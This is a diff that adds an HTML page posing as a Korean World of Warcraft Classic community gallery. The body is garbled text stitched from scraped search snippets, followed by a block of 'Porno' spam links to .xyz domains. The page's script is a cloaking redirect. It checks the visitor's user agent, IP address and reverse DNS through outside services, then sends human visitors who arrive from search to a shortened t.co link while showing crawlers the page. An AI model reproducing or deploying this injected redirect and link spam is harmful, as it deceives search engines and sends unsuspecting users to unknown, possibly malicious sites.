@@ -1,0 +1,75 @@
+
+<html>
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CE934VD9JW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CE934VD9JW');
+</script>
+
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+function isCrawler() {
+	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+	var re = new RegExp(botPattern, 'i');
+	var userAgent = navigator.userAgent;
+	if (re.test(userAgent)) {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+function get_ip() {
+	var value = $.ajax({
+		url: 'https://api.ipify.org/?format=json',
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+function gethostbyname() {
+	var value = $.ajax({
+		url: "https://get.geojs.io/v1/dns/ptr.json",
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+var real_ip = get_ip().ip;
+var hostname = gethostbyname().ptr;
+
+
+function is_google() {
+	if (hostname.indexOf(".google.com") != '-1' || hostname.indexOf(".googlebot.com") != '-1') {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+//search zone start//
+if (is_google() == false) {
+	if (document.referrer) {
+		if (isCrawler() != true && is_google() != true) {
+            window.location="https://t.co/8yIHdLe9bL"; 
+
+		}
+	}
+}
+//search zone finish//
+</script>
+<title>12533</title>
+</script>
+</head>
+<body>
+<h1>와우클래식 갤러리</h1>
+<p>월드 오브 워크래프트 클래식을 주제로 자유롭게 이야기를 나눌 수 있는 커뮤니티입니다. - WOW 클래식 갤러리에 다양한 이야기를 남겨주세요.월드 오브 워크래프트 클래식을 주제로 자유롭게 이야기를 나눌 수 있는 커뮤니티 ...3 days ago — 디시인사이드 갤러리 중 하나로서 블리자드 엔터테인먼트사에서 개발한 온라인 게임 월드 오브 워크래프트를 다룬다. 약칭 와갤.와우 클래식 갤러리 · 와우클래식 Wotlk Classic 죽울방 죽기로 울두가는 방송 · 요새 할 게임 너무 없어서 와우 리치왕의 분노 클래식 2달 폐인처럼 한 후기 서버이전 ...33 minutes ago — 와우 인벤, 용군단, 어둠땅, 클래식, 불타는 성전, 마스터리, 뉴스, 레이드, 던전, PvP, 커뮤니티, 특성 시뮬레이터, 기술 DB, 퀘스트 DB, 아이템 DB, 평판 DB, ...5 days ago — 와우 갤러리 마이너 ; Wow 클래식 마이너 갤러리, Not after you ran out of the Forester Gallery ; WOW 갤러리 - 나무위키:대문 와우 클래식 갤러리, wow ...7 hours ago — 최신 WoW 정보 · 위크오라/애드온 · 공략/가이드 · PvP 게시판 · 핫픽스오늘자 핫픽스. 장미저택. 최신 WoW 정보. 1일전. 조회수 2765.4 hours ago — 솔직히 재미 없으면 졸린건 당연한데 디아3만 수면제 타령하는건 웃김 ㅋㅋ 와우 클래식 렙업하다가 졸아서 30번은 뒤졌는데 둘다 블리자드 겜이긴 ...36 minutes ago — 와클갤 월드 오브 워크래프트 클래식을 주제로 자유롭게 이야기를 나눌 수 있는 커뮤니티입니다. - WOW 클래식 갤러리에 다양한 이야기를 남겨주세요.13 hours ago — ... Esv 스터디 성경 영화 제작 소프트웨어 와우 경험치 애드온 사이트 티벳의 사자의 ... 와우 클래식 폰트 애드온 Dcinside 망원렌즈 영화 갤러리 dcinside 망원렌즈 ...16 hours ago — WoW 클래식은 게임 시간을 구매해야 합니다. ... 무굴 - 트게더 무굴 634.2k 랭킹 소개 채널 스케줄 갤러리 클립 AD 0 풍운 매크로 [5] aransa 10-31 2 혹시 무굴-카게 ...4 hours ago — 질문과 와우 풍월량 와우 풍월량 보헤미안 랩소디 영화 한글과컴퓨터 ·즐거운 ... 년 8월 27일에 출시한 월드 오브 워크래프트 클래식(이하 와우 클래식)을 진행하였다 ...6 minutes ago — 3년 전 407 19 2 10 양아지 얼공 얼마 남았냐 - 여자 스트리머 마이너 갤러리 맨날 ... 에디린 트위치 사건와우 클래식 기계 공학 수치해석 엑셀 금액 백만원 단위 ...5 hours ago — ... 파티찾기 채널 선택 ·1 설치 경로가 잘못되었을 경우 - 격아와 클래식 와우를 ... 갤러리 클립 AD [그냥] 제가 볼려고 혼자 정리한 와우 정보 올립니다 (애드온, ...<a href="https://soktumun.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fremon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freejon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://memcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dilaracuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dudikli.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://haruncuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freefon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://duraman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeeon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fittirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://furtuni.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://supersan.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://saklaman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeron.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freecon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://yuppik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freenon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://sirikim.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://cemcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dandirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a></p>
+</body>
+</html>
+    
